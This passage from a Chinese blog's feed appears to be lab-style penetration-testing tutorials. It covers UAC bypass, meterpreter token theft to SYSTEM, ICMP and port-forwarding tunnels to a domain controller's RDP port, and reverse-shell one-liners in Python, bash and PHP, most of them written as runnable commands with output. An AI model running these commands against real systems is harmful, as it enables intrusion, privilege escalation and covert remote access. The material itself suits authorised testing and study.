exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">5   exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br><span class="line">6   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">7   exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">8   exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)</span><br><span class="line">9   exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)</span><br><span class="line">10  exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)</span><br><span class="line">11  exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">12  exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x05-令牌盗取"><a href="#0x05-令牌盗取" class="headerlink" title="0x05.令牌盗取"></a>0x05.令牌盗取</h2><h3 id="1-msf盗取"><a href="#1-msf盗取" class="headerlink" title="1.msf盗取"></a>1.msf盗取</h3><blockquote><p>当获得meterpreter时可以使用</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: JIYE\Administrator</span><br><span class="line">meterpreter &gt; use incognito </span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">JIYE\Administrator</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">No tokens available</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-漏洞发现&quot;&gt;&lt;a href=&quot;#0x01-漏洞发现&quot; class=&quot;headerlink&quot; title=&quot;0x01.漏洞发现&quot;&gt;&lt;/a&gt;0x01.漏洞发现&lt;/h2&gt;&lt;h3 id=&quot;1-WMIC发现安装补丁&quot;&gt;&lt;a href=&quot;#1-WMIC发现安装补丁&quot; class=&quot;headerlink&quot; title=&quot;1.WMIC发现安装补丁&quot;&gt;&lt;/a&gt;1.WMIC发现安装补丁&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2-msf发现安装补丁&quot;&gt;&lt;a href=&quot;#2-msf发现安装补丁&quot; class=&quot;headerlink&quot; title=&quot;2.msf发现安装补丁&quot;&gt;&lt;/a&gt;2.msf发现安装补丁&lt;/h3&gt;&lt;p&gt;&lt;code&gt;首先使用msfvenom生成恶意程序&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=6666 -f exe &amp;gt; shell.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="内网渗透测试" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="内网安全" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透测试-隐藏通信隧道技术</title>
    <link href="https://lunamoore.github.io/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"/>
    <id>https://lunamoore.github.io/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</id>
    <published>2021-07-24T09:30:16.000Z</published>
    <updated>2021-07-24T09:55:56.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01.基础知识"></a>0x01.基础知识</h2><blockquote><p>完成内网信息搜集后，需要先判断流量是否出得去、进得来。隐藏通信隧道技术常用于在访问受限的网络环境中追踪数据流向和在非受信任的网络中实现安全的数据传输。</p></blockquote><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><p>​        在渗透场景中，各种安全设备会检查对外连接的情况，如果发现异常，就会对通信进行阻断。因此建立专门的隐蔽隧道就十分必要，这能绕过端口屏蔽。<br>常用的隧道如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网络层隧道：IPv6、ICMP、GRE</span><br><span class="line">传输层隧道：TCP、UDP、常规端口转发</span><br><span class="line">应用层隧道：SSH、HTTP、HTTPS、DNS</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="2-判断内网的连通性"><a href="#2-判断内网的连通性" class="headerlink" title="2.判断内网的连通性"></a>2.判断内网的连通性</h3><p>​        判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议（TCP、HTTP、DNS、ICMP等）及端口通信的情况。常见的允许流量流出的端口有80、8080、443、53、110、123等，常用的内网的连通性判断方法如下：</p><p><code>ICMP协议</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure><p><code>TCP协议</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv 10.1.1.5 3306</span><br></pre></td></tr></table></figure><p><code>DNS协议</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baiduc.om 8.8.8.8</span><br><span class="line">dig @8.8.8.8 www.baidu.com</span><br></pre></td></tr></table></figure><p><code>HTTP协议</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure><p>​        还有一种情况是流量不能直接流出，需要在内网中设置代理，判断方法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、查看网络连接，判断是否存在与其他机器的1080（不绝对）等端口的连接，可尝试运行ping -n 1 -a ip命令</span><br><span class="line">2、查看内网中是否有主机名类似于&quot;proxy&quot;的机器。</span><br><span class="line">3、查看IE浏览器的直接代理。</span><br><span class="line">4、根据pac（代理自动配置）文件的路径（远程、本地），将其下载并查看。</span><br><span class="line">5、执行如下命令，利用curl工具确认：</span><br><span class="line">    curl https://www.baidu.com            //不通</span><br><span class="line">    curl -x proxy-ip:port www.baidu.com        //通</span><br></pre></td></tr></table></figure><h2 id="0x02-网络层隧道技术"><a href="#0x02-网络层隧道技术" class="headerlink" title="0x02.网络层隧道技术"></a>0x02.网络层隧道技术</h2><h3 id="1-IPv6隧道"><a href="#1-IPv6隧道" class="headerlink" title="1.IPv6隧道"></a>1.IPv6隧道</h3><blockquote><p>IPv6隧道技术是指通过IPv4隧道传输IPv6数据报文的技术，也就是说，将IPv6报文整体封装在IPv4数据报文中，以便在IPv4隧道中传输。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为现阶段的部分安全设备无法识别IPv6的通信技术，而大多数操作系统支持IPv6，因此可以通过某些软件来配置允许进行IPv6通信以此来避开防火墙和入侵检测系统，而即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包。</span><br><span class="line">支持IPv6隧道的工具有socat、6tunnel、nt6tunnel等。</span><br></pre></td></tr></table></figure><h3 id="2-ICMP隧道"><a href="#2-ICMP隧道" class="headerlink" title="2.ICMP隧道"></a>2.ICMP隧道</h3><blockquote><p>在一般的通信协议里，如果两台设备要进行通信，首先肯定需要开放端口，而在ICMP下就不需要，在一些网络环境中如果使用各类上层隧道（HTTP、DNS、常规正反向端口转发等）进行的操作都失败后，常常会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP/UDP数据封装在ICMP的ping数据包中，从而穿过防火墙。</p></blockquote><p><code>常用的ICMP隧道工具有icmpsh、PingTunnel、icmptunnel、powershell icmp等：</code></p><h4 id="01-icmpsh"><a href="#01-icmpsh" class="headerlink" title="01.icmpsh"></a>01.icmpsh</h4><p><code>利用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：python2 icmpsh_m.py &lt;本机IP&gt; &lt;目标IP&gt;</span><br><span class="line">靶机：icmpsh -t &lt;外连主机IP&gt; -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><p><code>首先需要安装impacket</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载地址：https://github.com/SecureAuthCorp/impacket</span><br><span class="line">cd impacket</span><br><span class="line">python2 -m pip install .</span><br></pre></td></tr></table></figure><p><code>先在kali上运行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 icmpsh_m.py 192.168.1.8 192.168.1.6</span><br></pre></td></tr></table></figure><p><code>在靶机上运行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh -t 192.168.1.8 -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><p><code>得到shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/Downloads/icmpsh# python2 icmpsh_m.py 192.168.1.8 192.168.1.6</span><br><span class="line">Microsoft Windows [�汾 5.2.3790]</span><br><span class="line">(C) ��Ȩ���� 1985-2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">admin-ad4c9d4d8\administrator</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter ��������:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : local</span><br><span class="line">   IP Address. . . . . . . . . . . . : 10.1.1.4</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 10.1.1.1</span><br><span class="line"></span><br><span class="line">Ethernet adapter �������� 2:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   IP Address. . . . . . . . . . . . : 192.168.1.6</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.1.1</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;</span><br></pre></td></tr></table></figure><p><code>抓包分析</code></p><blockquote><p>192.168.1.10向192.168.1.6发起请求whoami</p></blockquote><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722121825789.png" class><blockquote><p>192.168.1.6向192.168.1.10响应</p></blockquote><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722121936653.png" class><h4 id="02-PingTunnel"><a href="#02-PingTunnel" class="headerlink" title="02.PingTunnel"></a>02.PingTunnel</h4><p><code>安装依赖</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> cd libpcap-1.10.1</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd PingTunnel/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">遇到报错安装以下</span><br><span class="line">apt-get install flex byacc -y #我遇到的报错是缺这俩</span><br></pre></td></tr></table></figure><p><code>利用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">kali攻击机</span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ifconfig                                                                                                                                             71 ⨯</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.7  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:befd:d9fb:f05a:6005  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        inet6 fe80::20c:29ff:fe4f:2524  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:20c:29ff:fe4f:2524  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        ether 00:0c:29:4f:25:24  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 12484  bytes 6520141 (6.2 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 3141  bytes 662478 (646.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 44  bytes 2816 (2.7 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 44  bytes 2816 (2.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">web服务器</span><br><span class="line">[root@mail ~]# ifconfig</span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.11  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:63bf:e247:b694:9bca  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        inet6 fe80::93f3:83a7:a47f:dda4  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a0:ac:5d  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 7482  bytes 1008757 (985.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 3140  bytes 833053 (813.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">ens34: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.1.1.6  netmask 255.255.255.0  broadcast 10.1.1.255</span><br><span class="line">        inet6 fe80::5577:a12e:72b8:66dd  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a0:ac:67  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 851  bytes 366945 (358.3 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 509  bytes 68150 (66.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 109  bytes 6323 (6.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 109  bytes 6323 (6.1 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">内网DC</span><br><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以太网适配器 Ethernet0:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : local</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::b12d:4163:32df:fa72%4</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 10.1.1.5</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 10.1.1.1</span><br></pre></td></tr></table></figure><p><code>首先web服务器运行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -x pass</span><br></pre></td></tr></table></figure><p><code>kali运行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 192.168.1.11 -lp 6666 -da 10.1.1.5 -dp 3389 -x pass</span><br><span class="line">上述命令含义：在访问kali的6666端口，会把DC 10.1.1.5的3389端口封装在ICMP隧道里，以web服务器192.168.1.11为ICMP隧道跳板进行传送。</span><br></pre></td></tr></table></figure><p><code>参数</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-x    指定ICMP隧道连接的验证密码</span><br><span class="line">-lp 指定本地监听的TCP端口</span><br><span class="line">-da 指定要转发的目标机器IP</span><br><span class="line">-dp 指定要转发的目标机器TCP端口</span><br><span class="line">-p  指定ICMP隧道另一端机器的IP</span><br></pre></td></tr></table></figure><p><code>登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desktop 192.168.1.7:6666</span><br><span class="line">desktop 127.0.0.1:6666</span><br><span class="line">windows的mstsc登入也可以</span><br></pre></td></tr></table></figure><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722145522318.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150059749.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150435797.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150519192.png" class><h2 id="0x03-传输层隧道"><a href="#0x03-传输层隧道" class="headerlink" title="0x03.传输层隧道"></a>0x03.传输层隧道</h2><h3 id="1-lcx内网端口转发"><a href="#1-lcx内网端口转发" class="headerlink" title="1.lcx内网端口转发"></a>1.lcx内网端口转发</h3><p><code>目标主机执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 192.168.1.2 4444 127.0.0.1 3389    # 将本机3389端口转发到hack机4444端口</span><br></pre></td></tr></table></figure><p><code>hack机执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen  4444 5555    #将本机4444端口监听的所有数据传输到5555端口</span><br></pre></td></tr></table></figure><p><code>hack机mstsc 127.0.0.1:5555登入</code></p><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722184135571.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722184150355.png" class><h3 id="2-nc"><a href="#2-nc" class="headerlink" title="2.nc"></a>2.nc</h3><p><code>参数</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-d 后台模式</span><br><span class="line">-e 程序重定向</span><br><span class="line">-g &lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个；</span><br><span class="line">-G &lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数；</span><br><span class="line">-h 在线帮助；</span><br><span class="line">-i &lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口；</span><br><span class="line">-l 使用监听模式，管控传入的资料；</span><br><span class="line">-n 直接使用IP地址，而不通过域名服务器；</span><br><span class="line">-o &lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；</span><br><span class="line">-p &lt;通信端口&gt; 设置本地主机使用的通信端口；</span><br><span class="line">-r 随机指定本地与远端主机的通信端口；</span><br><span class="line">-s &lt;来源位址&gt; 设置本地主机送出数据包的IP地址；</span><br><span class="line">-u 使用UDP传输协议；</span><br><span class="line">-v 详细输出；</span><br><span class="line">-w &lt;超时秒数&gt; 设置等待连线的时间；</span><br><span class="line">-z 将输入输出关掉，只在扫描通信端口时使用。</span><br></pre></td></tr></table></figure><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h3><h4 id="01-python反弹shell"><a href="#01-python反弹shell" class="headerlink" title="01.python反弹shell"></a>01.python反弹shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.1681.11&quot;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="02-bash反弹shell"><a href="#02-bash反弹shell" class="headerlink" title="02.bash反弹shell"></a>02.bash反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp 192.168.1.11/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h4 id="03-PHP反弹shell"><a href="#03-PHP反弹shell" class="headerlink" title="03.PHP反弹shell"></a>03.PHP反弹shell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span 